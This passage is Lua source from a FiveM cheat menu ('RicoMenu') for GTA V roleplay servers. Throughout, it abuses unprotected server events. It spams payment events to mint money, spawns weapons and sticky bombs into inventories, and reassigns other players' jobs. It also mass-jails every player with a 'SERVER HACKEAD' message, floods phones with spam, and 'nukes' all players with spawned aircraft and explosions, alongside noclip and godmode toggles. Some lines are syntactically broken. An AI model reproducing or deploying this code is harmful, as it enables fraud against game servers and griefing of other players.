                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                        TriggerServerEvent("reanimar:pagamento")
                                end
                        elseif RicoMenu.Button("~g~MONEY~s~ 9 ~b~ VRP|Vrpx~w~ (SAMU|SALARIO)") then
                                local result = 9999
                                if result then
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                        TriggerServerEvent('salario:pagamento')
                                end
            elseif RicoMenu.Button("~g~MONEY~s~ 10 ~b~ VRP|Vrpx~w~ (SAMU|SALARIO) ~r~OFF") then
                                local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
                                if result then
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
                                        TriggerServerEvent("offred:salar")
										end
			elseif RicoMenu.Button("~s~Bank ~r~~h~Deposit") then
				local money = GetKeyboardInput("Enter amount of money", "", 100)
				if money then
				TriggerServerEvent("bank:deposit", money)
				end
			elseif RicoMenu.Button("~s~Bank ~r~~h~Withdraw ") then
				local money = GetKeyboardInput("Enter amount of money", "", 100)
				if money then
				TriggerServerEvent("bank:withdraw", money)
				end
			end
			
			 elseif RicoMenu.IsMenuOpened('player1') then
                local playerlist = GetActivePlayers()
                for i = 1, #playerlist do
                    local currPlayer = playerlist[i]
                    if RicoMenu.MenuButton("ID: ~g~[" .. GetPlayerServerId(currPlayer) .. "] ~s~~h~" .. GetPlayerName(currPlayer), 'other') then
                        selectedPlayer = currPlayer end
                end
			
			elseif RicoMenu.IsMenuOpened('other') then
			if RicoMenu.Button("~r~Remove Job") then
                TriggerServerEvent("NB:destituerplayer",GetPlayerServerId(selectedPlayer))
			elseif RicoMenu.Button("~s~Recruit~c~ Mechanic") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mecano", result)
			elseif RicoMenu.Button("~s~Recruit~b~ Police") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
				TriggerServerEvent('Corujas RP-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "police", result)
			elseif RicoMenu.Button("~s~Recruit~c~ Mafia") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "mafia", result)
			elseif RicoMenu.Button("~s~Recruit~p~ Gang") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "gang", result)
			elseif RicoMenu.Button("~s~Recruit~y~ Taxi") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "taxi", result)
			elseif RicoMenu.Button("~s~Recruit~b~ Inem") then
			local result = GetKeyboardInput("Enter Nivel Job ~g~0-10", "", 10)
				TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
				TriggerServerEvent('Esx-MenuPessoal:Boss_recruterplayer', GetPlayerServerId(selectedPlayer), "ambulance", result)
			end
        
        
      
        elseif RicoMenu.IsMenuOpened('esx') then
            if RicoMenu.Button("~g~ESX ~w~Restore Hunger") then
                TriggerEvent("esx_status:set", "hunger", 1000000)
            elseif RicoMenu.Button("~g~ESX ~w~Restore Thirst") then
                TriggerEvent("esx_status:set", "thirst", 1000000)
            elseif RicoMenu.Button("~g~ESX ~w~Revive Self") then
                TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(PlayerId()))
            elseif RicoMenu.Button("~g~ESX ~w~Revive By ID") then
                local serverID = GetKeyboardInput("Enter Player Server ID:")
                TriggerServerEvent('esx_ambulancejob:revive', serverID)
            end
        
        
        
        elseif RicoMenu.IsMenuOpened('vrp') then
            if RicoMenu.Button("~y~[QB] ~w~Spawn ~p~SMG ~w~+ ~w~Ammo ~y~[INVENTORY]") then
                TriggerServerEvent('QBCore:Server:AddItem',"weapon_smg",1)
                TriggerServerEvent('QBCore:Server:AddItem',"smg_ammo",100)
            elseif RicoMenu.Button("~y~[QB] ~w~Spawn ~p~X5 ~w~Sticky Bomb ~y~[INVENTORY]") then
                TriggerServerEvent('QBCore:Server:AddItem',"weapon_stickybomb",5)
                elseif RicoMenu.Button("~y~[QB] ~w~Spawn ~p~X5 ~w~Lockpick + Advanced ~y~[INVENTORY]") then
                TriggerServerEvent('QBCore:Server:AddItem',"lockpick",5)
                TriggerServerEvent('QBCore:Server:AddItem',"advancedlockpick",5)
                elseif RicoMenu.Button("~y~[QB] ~w~Spawn ~p~X5 ~w~All Security Card ~y~[INVENTORY]") then
                TriggerServerEvent('QBCore:Server:AddItem',"security_card_01",5)
                TriggerServerEvent('QBCore:Server:AddItem',"security_card_02",5)
                TriggerServerEvent('QBCore:Server:AddItem',"security_card_03",5)
                TriggerServerEvent('QBCore:Server:AddItem',"security_card_04",5)
            elseif RicoMenu.Button("~y~[QB] ~w~Recycle ~p~Job ~b~Items 💻") then
				    Citizen.CreateThread(function()
                      for i = 0 , 100 do
                    TriggerServerEvent('qb-recyclejob:server:getItem')  
                          Citizen.Wait(300)
                    end
                    end)
            end
        
      
        elseif RicoMenu.IsMenuOpened('credits') then
            for i = 1, #developers do if RicoMenu.Button(developers[i]) then end end
        
        
     
        elseif IsDisabledControlJustReleased(0, Keys[menuKeybind]) then RicoMenu.OpenMenu('skid')
	
		
		elseif IsDisabledControlPressed(0, Keys[menuKeybind2]) then RicoMenu.OpenMenu('skid')
        
        elseif IsControlJustReleased(0, Keys[noclipKeybind]) then ToggleNoclip() 
		
		elseif IsControlJustReleased(0, Keys[teleportKeyblind]) then TeleportToWaypoint() 
		
		elseif IsControlJustReleased(0, Keys[fixvaiculoKeyblind]) then fixcar() end 
        
        RicoMenu.Display()
        
       
        if Demigod then
            if GetEntityHealth(PlayerPedId()) < 200 then
                SetEntityHealth(PlayerPedId(), 200)
            end
        end
        
        if ADemigod then
            SetEntityHealth(PlayerPedId(), 189.9)
        end
 
        if Noclipping then
            local isInVehicle = IsPedInAnyVehicle(PlayerPedId(), 0)
            local k = nil
            local x, y, z = nil
            
            if not isInVehicle then
                k = PlayerPedId()
                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 2))
            else
                k = GetVehiclePedIsIn(PlayerPedId(), 0)
                x, y, z = table.unpack(GetEntityCoords(PlayerPedId(), 1))
            end
            
            if isInVehicle and GetSeatPedIsIn(PlayerPedId()) ~= -1 then RequestControlOnce(k) end
            
            local dx, dy, dz = GetCamDirection()
            SetEntityVisible(PlayerPedId(), 0, 0)
            SetEntityVisible(k, 0, 0)
            
            SetEntityVelocity(k, 0.0001, 0.0001, 0.0001)
            
            if IsDisabledControlJustPressed(0, Keys["LEFTSHIFT"]) then -- Change speed
                oldSpeed = NoclipSpeed
                NoclipSpeed = NoclipSpeed * 2
            end
            if IsDisabledControlJustReleased(0, Keys["LEFTSHIFT"]) then -- Restore speed
                NoclipSpeed = oldSpeed
            end
            
            if IsDisabledControlPressed(0, 32) then -- MOVE FORWARD
                x = x + NoclipSpeed * dx
                y = y + NoclipSpeed * dy
                z = z + NoclipSpeed * dz
            end
            
            if IsDisabledControlPressed(0, 269) then -- MOVE BACK
                x = x - NoclipSpeed * dx
                y = y - NoclipSpeed * dy
                z = z - NoclipSpeed * dz
            end
			
			if IsDisabledControlPressed(0, Keys["SPACE"]) then -- MOVE UP
                z = z + NoclipSpeed
            end
            
			if IsDisabledControlPressed(0, Keys["LEFTCTRL"]) then -- MOVE DOWN
                z = z - NoclipSpeed
            end
            
            
            SetEntityCoordsNoOffset(k, x, y, z, true, true, true)
        end
        
        if ExplodingAll then
            ExplodeAll(includeself)
        end
        
        if Tracking then
            local coords = GetEntityCoords(GetPlayerPed(TrackedPlayer))
            SetNewWaypoint(coords.x, coords.y)
        end
        
		if FlingingPlayer then
			local coords = GetEntityCoords(GetPlayerPed(FlingedPlayer))
			Citizen.InvokeNative(0xE3AD2BDBAEE269AC, coords.x, coords.y, coords.z, 4, 1.0, 0, 1, 0.0, 1)
		end
		
        if InfStamina then
            RestorePlayerStamina(PlayerId(), GetPlayerSprintStaminaRemaining(PlayerId()))
        end

        if SuperJump then
            SetSuperJumpThisFrame(PlayerId())
        end
        
        if Invisibility then
            SetEntityVisible(PlayerPedId(), 0, 0)
        end
        
        if Forcefield then
            DoForceFieldTick(ForcefieldRadius)
        end
		
		
        
        if CarsDisabled then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                if IsPedInAnyVehicle(GetPlayerPed(plist[i]), true) then
                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                end
            end
        end
        
        if GunsDisabled then
            local plist = GetActivePlayers()
            for i = 1, #plist do
                if IsPedShooting(GetPlayerPed(plist[i])) then
                    ClearPedTasksImmediately(GetPlayerPed(plist[i]))
                end
            end
        end
        
        if NoisyCars then
            for k in EnumerateVehicles() do
                SetVehicleAlarmTimeLeft(k, 500)
            end
        end
        
        if FlyingCars then
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                ApplyForceToEntity(k, 3, 0.0, 0.0, 500.0, 0.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
            end
        end
		
		if Enable_GcPhone then
                for i = 0, 450 do
                    FiveM.TriggerCustomEvent(false, "gcPhone:sendMessage", GetPlayerServerId(i), 5000, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
                    FiveM.TriggerCustomEvent(false, 'gcPhone:sendMessage', num, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
                    FiveM.TriggerCustomEvent(false, 'gcPhone:sendMessage', 5000, num, "剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車剎車")
                    end
                end
        
        if SuperGravity then
            for k in EnumerateVehicles() do
                RequestControlOnce(k)
                SetVehicleGravityAmount(k, GravAmount)
            end
        end
		
		if RainbowVeh then
                local u48y34 = k(1.0)
                SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			if ou328hSync then
                local u48y34 = k(1.0)
				local ped = PlayerPedId()
                local veh = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 1, true)
                SetVehicleNeonLightEnabled(veh, 2, true)
                SetVehicleNeonLightEnabled(veh, 3, true)
				SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
			
			if ou328hNeon then
                local u48y34 = k(1.0)
		    local ped = PlayerPedId()
            local veh = GetVehiclePedIsUsing(ped)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 0, true)
                SetVehicleNeonLightEnabled(veh, 1, true)
                SetVehicleNeonLightEnabled(veh, 2, true)
                SetVehicleNeonLightEnabled(veh, 3, true)
                SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), u48y34.r, u48y34.g, u48y34.b)
            end
			
		
		if Enable_Jail then
				i = 0, 450 do
                    FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJail", GetPlayerServerId(i), 3000)
                    FiveM.TriggerCustomEvent(false, "esx_jailler:sendToJail", GetPlayerServerId(i), 59999, "", 997)
                    FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJail", GetPlayerServerId(i), 9937, "", 300)
                    FiveM.TriggerCustomEvent(false, "esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, "esx-qalle-jail:jailPlayerNew", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, "esx_jail:sendToJail", GetPlayerServerId(i), 50000)
                    FiveM.TriggerCustomEvent(false, "8321hiue89js", GetPlayerServerId(i), 5007, "", 32532532, securityToken)
                    FiveM.TriggerCustomEvent(false, "esx_jailer:sendToJailCatfrajerze", GetPlayerServerId(i), 300000, "", 500324532)
                    FiveM.TriggerCustomEvent(false, "esx_jail:sendToJail", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, "js:jailuser", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, "wyspa_jail:jailPlayer", GetPlayerServerId(i), 300000, "", 500324532)
                    FiveM.TriggerCustomEvent(false, "wyspa_jail:jail", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, "esx_policejob:billPlayer", GetPlayerServerId(i), 5000, "")
                    FiveM.TriggerCustomEvent(false, 'chatMessageEntered', "SYSTEM", { 0, 0, 0 }, GetPlayerName(PlayerId()) .."")
					TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60)
					TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60)
					TriggerServerEvent("esx-qalle-jail:updateJailTime", GetPlayerServerId(i), 45 * 60)
					TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "SERVER HACKEAD BY ****Rico****")
					TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "SERVER HACKEAD BY ****Rico****")
					TriggerServerEvent("esx-qalle-jail:updateJailTime_n96nDDU@X?@zpf8", GetPlayerServerId(i), 45 * 60, "SERVER HACKEAD BY ****Rico****")
					end
				end
				
				
	if Enable_Nuke then
                Citizen.CreateThread(
                    function()
              
						local dj = 'Avenger'
                        local dk = 'CARGOPLANE'
                        local dl = 'luxor'
                        local dm = 'maverick'
                        local dn = 'blimp2'
                        while not HasModelLoaded(GetHashKey(dk)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dk))
                        end
                        while not HasModelLoaded(GetHashKey(dl)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dl))
                        end
                        while not HasModelLoaded(GetHashKey(dj)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dj))
                        end
                        while not HasModelLoaded(GetHashKey(dm)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dm))
                        end
                        while not HasModelLoaded(GetHashKey(dn)) do
                            Citizen.Wait(0)
                            RequestModel(GetHashKey(dn))
                        end
                        for i = 0, 128 do
                            local dl =
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dj), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dj), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dk), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dk), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dl), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dl), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dm), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dm), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) and
                                CreateVehicle(GetHashKey(dn), GetEntityCoords(GetPlayerPed(i)) + 10.0, true, true) and
                                CreateVehicle(GetHashKey(dn), 2 * GetEntityCoords(GetPlayerPed(i)) + 15.0, true, true) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0) and
                                AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, true)
                            end
                        end
                )
            end
		
		
	if nukeserver then
    Citizen.CreateThread(
	function()
        local dg="Avenger"
        local dh="CARGOPLANE"
        local di="luxor"
        local dj="maverick"
        local dk="blimp2"

        while not HasModelLoaded(GetHashKey(dh))do
            Citizen.Wait(0)
            RequestModel(GetHashKey(dh))
        end

        while not HasModelLoaded(GetHashKey(di))do
            Citizen.Wait(0)RequestModel(GetHashKey(di))
        end

        while not HasModelLoaded(GetHashKey(dg))do
            Citizen.Wait(0)RequestModel(GetHashKey(dg))
        end

        while not HasModelLoaded(GetHashKey(dj))do
            Citizen.Wait(0)RequestModel(GetHashKey(dj))
        end

        while not HasModelLoaded(GetHashKey(dk))do
            Citizen.Wait(0)RequestModel(GetHashKey(dk))
        end

        for bs=0,9 do
            
        end

        for i=0,128 do
            local di=CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+2.0,true,true) and CreateVehicle(GetHashKey(dg),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dg),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dh),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dh),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(di),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(di),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dj),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dj),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+2.0,true,true)and CreateVehicle(GetHashKey(dk),GetEntityCoords(GetPlayerPed(i))+10.0,true,true)and CreateVehicle(GetHashKey(dk),2*GetEntityCoords(GetPlayerPed(i))+15.0,true,true)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,100000.0)and AddExplosion(GetEntityCoords(GetPlayerPed(i)),5,3000.0,true,false,true)
        end
		ShowInfo("~g~Fucked :(")
     end)
    end
        
        if WorldOnFire then
            local pos = GetEntityCoords(PlayerPedId())
            local k = GetRandomVehicleInSphere(pos, 100.0, 0, 0)
            if k ~= GetVehiclePedIsIn(PlayerPedId(), 0) then
                local targetpos = GetEntityCoords(k)
                local x, y, z = table.unpack(targetpos)
                local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                local expposz = math.random(math.floor(z - 0.5), math.ceil(z + 1.5)) % z
                AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
            end
            
            for v in EnumeratePeds() do
                if v ~= PlayerPedId() then
                    local targetpos = GetEntityCoords(v)
                    local x, y, z = table.unpack(targetpos)
                    local expposx = math.random(math.floor(x - 5.0), math.ceil(x + 5.0)) % x
                    local expposy = math.random(math.floor(y - 5.0), math.ceil(y + 5.0)) % y
                    local expposz = math.random(math.floor(z), math.ceil(z + 1.5)) % z
                    AddExplosion(expposx, expposy, expposz, 1, 1.0, 1, 0, 0.0)
                    AddExplosion(expposx, expposy, expposz, 4, 1.0, 1, 0, 0.0)
                end
            end
        end
		

		
	
        
        if FuckMap then
            for i = -4000.0, 8000.0, 3.14159 do
                local _, z1 = GetGroundZFor_3dCoord(i, i, 0, 0)
                local _, z2 = GetGroundZFor_3dCoord(-i, i, 0, 0)
                local _, z3 = GetGroundZFor_3dCoord(i, -i, 0, 0)
                
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, i, z1, 0, 1, 1)
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), -i, i, z2, 0, 1, 1)
                CreateObject(GetHashKey("stt_prop_stunt_track_start"), i, -i, z3, 0, 1, 1)
            end
        end
		
        
        if ClearStreets then
            SetVehicleDensityMultiplierThisFrame(0.0)
            SetRandomVehicleDensityMultiplierThisFrame(0.0)
            SetParkedVehicleDensityMultiplierThisFrame(0.0)
            SetAmbientVehicleRangeMultiplierThisFrame(0.0)
            SetPedDensityMultiplierThisFrame(0.0)
        end
        
        if RapidFire then
            DoRapidFireTick()
        end
        
        if Aimbot then
            
            -- Draw FOV
            if DrawFov then
